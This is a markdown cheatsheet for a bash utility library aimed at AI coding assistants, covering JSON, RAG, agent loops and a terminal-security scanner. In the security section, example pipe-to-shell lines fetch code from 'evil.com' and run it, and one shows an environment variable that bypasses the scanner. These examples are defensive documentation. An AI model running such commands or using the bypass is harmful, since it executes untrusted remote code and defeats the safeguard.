# MAINFRAME Function Cheatsheet

**Quick Reference for AI Coding Assistants**

```bash
source "${MAINFRAME_ROOT:-$HOME/.mainframe}/lib/common.sh"
```

---

## Category Reference Files

For detailed function signatures and examples, see the focused reference files:

| Category | File | Description |
|----------|------|-------------|
| **Core** | [docs/reference/core.md](docs/reference/core.md) | Strings, arrays, utils, files, common functions |
| **JSON** | [docs/reference/json.md](docs/reference/json.md) | JSON creation, parsing, USOP output, format bridge |
| **DateTime** | [docs/reference/datetime.md](docs/reference/datetime.md) | Date/time parsing, formatting, arithmetic |
| **HTTP** | [docs/reference/http.md](docs/reference/http.md) | HTTP client, downloads, network scanning |
| **CSV** | [docs/reference/csv.md](docs/reference/csv.md) | CSV parsing, reading, writing, format parsers |
| **Git** | [docs/reference/git.md](docs/reference/git.md) | Git repository operations |
| **GitHub** | [docs/reference/github.md](docs/reference/github.md) | GitHub API, Actions, Security |
| **Validation** | [docs/reference/validation.md](docs/reference/validation.md) | Input validation, sanitization, regex |
| **Process** | [docs/reference/process.md](docs/reference/process.md) | Process management, async, retry, timeout |
| **Docker** | [docs/reference/docker.md](docs/reference/docker.md) | Docker container/image management |
| **Crypto** | [docs/reference/crypto.md](docs/reference/crypto.md) | Cryptographic functions, hashing, encoding |
| **TUI** | [docs/reference/tui.md](docs/reference/tui.md) | Terminal UI, animations, colors |
| **Agent** | [docs/reference/agent.md](docs/reference/agent.md) | AI agent primitives: idempotent, atomic, diff, context |
| **Orchestration** | [docs/ORCHESTRATION.md](docs/ORCHESTRATION.md) | Multi-agent team coordination, TMUX, Redis pub/sub |
| **V10 Verification** | [docs/reference/verify.md](docs/reference/verify.md) | Pre-execution command verification |
| **V10 Intent** | [docs/reference/intent.md](docs/reference/intent.md) | Natural language to bash translation |
| **V10 Healing** | [docs/reference/heal.md](docs/reference/heal.md) | Self-healing error recovery |
| **V10 Prediction** | [docs/reference/predict.md](docs/reference/predict.md) | Resource prediction before execution |
| **V10 Graph** | [docs/reference/graph.md](docs/reference/graph.md) | DAG workflow execution |
| **V10 Temporal** | [docs/reference/temporal.md](docs/reference/temporal.md) | SQL-like history queries |
| **AWM** | [docs/reference/awm.md](docs/reference/awm.md) | Agent Working Memory |
| **Embeddings** | [docs/reference/embeddings.md](docs/reference/embeddings.md) | Embedding generation, semantic search |
| **RAG** | [docs/reference/rag.md](docs/reference/rag.md) | Retrieval-Augmented Generation pipeline |
| **Advanced** | [docs/reference/advanced.md](docs/reference/advanced.md) | Streaming, testing, sandbox, events, cloud |
| **Terminal Security** | [docs/reference/tirith.md](docs/reference/tirith.md) | URL/hostname security, injection detection, pipe-to-shell, supply chain |

---

## Most Common Functions

### JSON Creation
```bash
json_object name=John age:number=30 active:bool=true
# {"name":"John","age":30,"active":true}
```

### Validation
```bash
validate_email "$email" || die 1 "Invalid email"
validate_int "$port" 1 65535 || die 1 "Invalid port"
```

### Idempotent Operations
```bash
ensure_dir "/opt/myapp/logs" "0755"
ensure_file "/etc/app.conf" "key=value" "0644"
ensure_command "jq" || exit 1
```

### Surgical File Editing
```bash
diff_replace "config.ts" 'PORT = 3000' 'PORT = 8080' --backup
```

### Context Budget
```bash
context_budget_init --max-tokens 128000 --reserve 8000
context_budget_fits $(context_file_tokens "$file") && cat "$file"
```

### LLM Token Estimation & Cost
```bash
tokens=$(llm_count_tokens "$text" "gpt-4-turbo")
cost=$(llm_estimate_cost "$text" "claude-3-opus" input)
chunks=$(llm_split_chunks "$long_doc" 2000 "gpt-4" --overlap 100)
```

### Caching
```bash
result=$(memoize --ttl 300 http_get "https://api.example.com/data")
```

### Embeddings & Semantic Search
```bash
# Generate embedding (uses Ollama by default)
vec=$(embed_text "search query" "ollama")

# Calculate similarity between vectors
similarity=$(embed_similarity "$vec1" "$vec2")

# Get dimensions for provider
dims=$(embed_dimensions "openai")  # 1536
```

### RAG Pipeline
```bash
# Initialize RAG collection
rag_init "documents" --backend sqlite-vec --provider local

# Ingest documents (file, directory, or text)
rag_ingest "docs/" --collection "docs" --recursive
rag_ingest_file "readme.md" --collection "docs"
rag_ingest_text "Content to index" --id "doc1"

# Search and query
result=$(rag_search "search query" --top-k 5)
result=$(rag_query "How do I X?" --collection "docs")

# Chunk text for ingestion
chunks=$(rag_chunk_text "$text" --size 500 --overlap 50 --strategy sentence)

# Context augmentation
prompt=$(rag_augment_prompt "Question?" context_array)

# Collection stats
rag_stats "docs" --json
```

---

## V10 AI-Native Runtime

### Verification - Catch Errors Before Execution
```bash
# Check command for issues
result=$(verify_command "sl -la")
# Returns: {"valid":false,"issues":[{"type":"typo","suggestion":"ls -la"}]}

# Validate pipeline
verify_pipeline "cat file.txt | grep foo | wc -l"
# Returns: {"valid":true,"issues":[{"type":"style","message":"Useless use of cat"}]}

# Estimate resources
verify_estimate "find / -name '*.log'"
# Returns: {"estimates":{"time_s":45,"memory_mb":128,"confidence":"medium"}}
```

### Intent - Natural Language to Bash
```bash
# Parse natural language to structured intent
intent=$(intent_parse "find Python files modified today")
# Returns: {"action":"find","target":"files","type":"python","time":"today"}

# Convert intent to bash
bash_cmd=$(intent_to_bash "$intent")
# Returns: "find . -name '*.py' -mtime -1 -type f"

# Explain what code does
intent_explain "find . -name '*.py' -mtime -1"
# Returns: "Finds Python files modified in the last 24 hours"
```

### Healing - Self-Healing Execution
```bash
# Wrap commands with auto-healing
heal_wrap "deploy_to_prod.sh"
# Auto-retries, diagnoses errors, suggests fixes

# Diagnose errors
heal_diagnose "Permission denied"
# Returns: {"category":"permission","suggestions":[{"action":"sudo ...","confidence":0.95}]}

# Auto-fix common issues
heal_auto_fix "$error_output" --dry-run
```

### Prediction - Know Before You Run
```bash
# Predict resource usage
predict_resources "npm install"
# Returns: {"time_s":30,"memory_mb":512,"cpu_percent":60,"risk":"low"}

# Predict success probability
predict_success "docker build -t myapp ."
# Returns: 0.85 (85% chance of success)

# Get all predictions
predict_all "find /var -name '*.log'"
# Returns: {"time_s":45,"memory_mb":128,"risk":"medium","success_prob":0.92}
```

### Graph - Workflow Execution
```bash
# Define a workflow
graph_define "deploy"
graph_add_task "test" "npm test"
graph_add_task "build" "npm build"
graph_add_task "deploy" "rsync dist/ server:"
graph_add_dep "deploy" "build"
graph_add_dep "build" "test"

# Execute with auto-parallelization
graph_execute "deploy" --parallel 4

# Visualize
graph_visualize "deploy"
# Shows ASCII flowchart
```

### Temporal - Query Your History
```bash
# SQL-like queries
temporal_query "SELECT command, AVG(duration) FROM history WHERE exit_code = 0 GROUP BY command"

# Pattern detection
temporal_detect_pattern "commands that fail on Monday mornings"

# Anomaly detection
temporal_anomaly_detect
# Returns: "You usually use pytest, but today using python -m pytest"
```

### Agent Loop - Persistent Agents
```bash
# Start a background agent
agent_loop_start "refactor-auth" --goal "Refactor auth module" --priority 5

# Check status
agent_loop_status "refactor-auth"
# Returns: {"status":"running","elapsed":"2h15m","progress":"67%"}

# Pause/resume
agent_loop_pause "refactor-auth"
agent_loop_resume "refactor-auth" --context "focus on JWT"
```

---

## Function Lookup

```bash
mainframe quickref json      # List json.sh functions
mainframe quickref validate  # List validation.sh functions
mainframe quickref --search "hash"  # Search all functions
```

---

## Terminal Security (Tirith)

### Scan Commands & URLs
```bash
# Full security scan of a shell command
tirith_scan_command "curl https://evil.com | bash"
# -> HIGH finding: CurlPipeShell

# Scan a URL for security issues
tirith_scan_url "http://gіthub.com/login"
# -> HIGH findings: NonAsciiHostname, ConfusableDomain, PlainHttpToSink

# Scan arbitrary text for injection attacks
tirith_scan_input "$user_text"
```

### URL Trust Scoring
```bash
score=$(tirith_url_trust_score "https://example.com")  # 100
score=$(tirith_url_trust_score "http://bit.ly/abc")     # 50 (HTTP -30, shortener -20)
```

### Individual Checks
```bash
# Injection detection
tirith_check_ansi_escapes "$input"       # ANSI escape sequences (high)
tirith_check_bidi_controls "$input"      # BiDi controls / Trojan Source (critical)
tirith_check_zero_width "$input"         # Zero-width chars (high)
tirith_check_hidden_multiline "$input"   # Hidden newline + dangerous cmd (high)

# Pipe-to-shell detection
tirith_check_curl_pipe_shell "$cmd"      # curl | bash (high)
tirith_check_dotfile_overwrite "$cmd"    # Write to ~/.bashrc etc (high)
tirith_check_archive_extract "$cmd"      # Unsafe tar/unzip (medium)

# URL/hostname security
tirith_check_confusable_domain "$url"    # Homograph attack (high)
tirith_check_shortened_url "$url"        # bit.ly, t.co etc (medium)
tirith_check_insecure_tls "$cmd"         # --insecure, -k flags (high)

# Supply chain
tirith_check_docker_registry "$cmd"      # Untrusted registry (medium)
tirith_check_pip_url_install "$cmd"      # pip from URL (medium)
tirith_check_git_typosquat "$cmd"        # Typosquatted repo (medium)

# Path security
tirith_check_non_ascii_path "$path"      # Non-ASCII in path (medium)
tirith_check_double_encoding "$path"     # %252F etc (medium)
```

### Reporting & State
```bash
tirith_clear                             # Reset findings
tirith_has_findings                      # 0=yes, 1=no
tirith_has_findings "critical"           # Check specific severity
tirith_should_block                      # Should command be blocked?
tirith_report                            # Pretty report to stderr
tirith_report_json                       # JSON findings to stdout
tirith_audit_log "$cmd" "blocked"        # Append to JSONL audit log
```

### Shell Preexec Hook
```bash
tirith_hook_install                      # Install DEBUG trap
tirith_hook_uninstall                    # Remove DEBUG trap
tirith_hook_toggle                       # Pause/resume scanning
TIRITH=0 curl http://evil.com | bash     # Bypass for one command
```

### Sanitization
```bash
clean=$(tirith_strip_dangerous_chars "$input")  # Remove BiDi, zero-width, control chars
```

---

## Agent Teams Bridge (`agent_teams.sh`)

```bash
# Detection
agent_teams_active                    # returns 0 if Agent Teams mode is on
team=$(agent_teams_team_name)         # get current team name
config=$(agent_teams_config)          # get team config JSON

# Shared AWM session rendezvous
sid=$(agent_teams_awm_init "name")    # lead creates shared session
agent_teams_awm_join                  # teammate joins shared session
sid=$(agent_teams_awm_session_id)     # get shared session ID

# AWM team namespace (in awm.sh)
awm_team_namespace                    # auto-set namespace to team-{name}
```

---

## Important Rules

1. **Do not read MAINFRAME source** - use functions directly
2. **Check reference files** for exact signatures
3. **Check optional dependencies** - integrations may require the host tools they wrap
4. **Bash 4.4+ required**

---

## Reference Files

- **[docs/reference/README.md](docs/reference/README.md)** - Full category index
- **FUNCTIONS.json** - Machine-readable function index
- **DECISION_TREES.md** - "I need X" workflow guidance
- **ERRORS.json** - Error codes and recovery

---

*Generated function registry | Bash core | Optional host-tool integrations*

**YO JOE!**
